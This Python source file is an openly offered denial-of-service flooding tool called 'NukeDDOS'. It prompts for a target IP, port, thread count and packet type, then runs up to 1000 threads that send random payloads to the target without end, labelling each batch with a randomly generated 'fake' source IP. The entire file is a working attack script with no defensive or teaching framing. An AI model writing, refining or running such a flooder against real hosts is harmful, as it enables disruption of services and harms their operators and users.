import os
import time
import socket
import random
import threading
import struct
from datetime import datetime

# Packet types for flexibility (converted to immutable tuple)
PACKET_TYPES = (
    ("UDP", socket.SOCK_DGRAM),
    ("RAW", socket.SOCK_RAW),
    ("ICMP", socket.SOCK_RAW),
    ("TCP", socket.SOCK_STREAM)
)

# Configuration interface (optimized for single system call)
os.system("clear && figlet -f slant NukeDDOS")
print("Author   : Laila19\ngithub   : https://github.com/lailacypher\n")
ip = input("Target IP : ").strip()
port = int(input("Port      : ").strip())
threads = int(input("Threads   : ").strip())

# Packet type selection (optimized with direct enumerate)
print("\nSelect packet type:")
for i, (packet_name, _) in enumerate(PACKET_TYPES, 1):
    print(f"{i}. {packet_name}")
type_choice = int(input("Packet Type (1-4): ").strip()) - 1
packet_name, sock_type = PACKET_TYPES[type_choice]

# Socket setup (resource pre-allocation)
sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if packet_name == "UDP" else 0)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
data = random._urandom(2048)  # Kept as original
sent = 0
lock = threading.Lock()

# Optimized progress bar (without unnecessary sleeps)
os.system("clear && figlet Attack Starting")
progress = ["[                    ] 0%", "[=====               ] 25%", 
            "[==========          ] 50%", "[===============     ] 75%", 
            "[====================] 100%"]
print("\n".join(progress))

# Random IP generation (optimized with direct generation)
def random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

# Optimized attack function (pre-formatted strings and reduced overhead)
def attack():
    global sent
    target = (ip, port)
    packet_base = data
    
    while True:
        try:
            # Create new socket for each thread to avoid broken pipe
            local_sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if packet_name == "UDP" else 0)
            local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            fake_ip = random_ip()
            # Optimized packet construction
            packet = packet_base + fake_ip.encode()
            
            # Batch sending (more efficient)
            for _ in range(5):
                try:
                    local_sock.sendto(packet[:512], target)
                    local_sock.sendto(packet[512:1024], target)
                    local_sock.sendto(packet[1024:1536], target)
                    local_sock.sendto(packet[1536:], target)
                except socket.error as e:
                    # Close broken socket and create new one
                    local_sock.close()
                    break
                
            # Thread-safe counter update
            with lock:
                sent += 5
                if sent % 100 == 0:  # Reduced log frequency
                    print(f"Packets {sent} sent to {ip}:{port} from {fake_ip}")
                    
        except Exception as e:
            print(f"Error: {str(e)[:50]}")  # Reduced log
            time.sleep(0.1)  # Prevent rapid error looping

# Optimized thread pool
threads = min(threads, 1000)  # Prevent overload
for _ in range(threads):
    thread = threading.Thread(target=attack, daemon=True)
    thread.start()

# Keep threads alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nAttack stopped by user")
